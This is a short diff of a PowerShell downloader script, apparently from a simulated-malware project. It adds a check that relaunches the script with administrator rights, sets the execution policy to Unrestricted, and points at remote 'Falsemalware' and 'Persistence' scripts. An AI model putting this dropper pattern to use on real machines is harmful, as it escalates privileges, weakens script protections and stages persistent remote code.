@@ -1,3 +1,10 @@
+if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+    if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
+        $CommandLine = "C:\temp\Downloader.ps1"
+        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
+        Exit
+    }
+}
 Set-ExecutionPolicy Unrestricted
 $url = "https://github.com/Freecil/Prjoetls/blob/475c44bf721eca0f17cef81af241f9971d8c929e/Falsemalware.ps1"
 $url3 = "https://github.com/Freecil/Prjoetls/blob/371f0c98311f52559748f1f963179872c8aea582/Persistence.ps1"
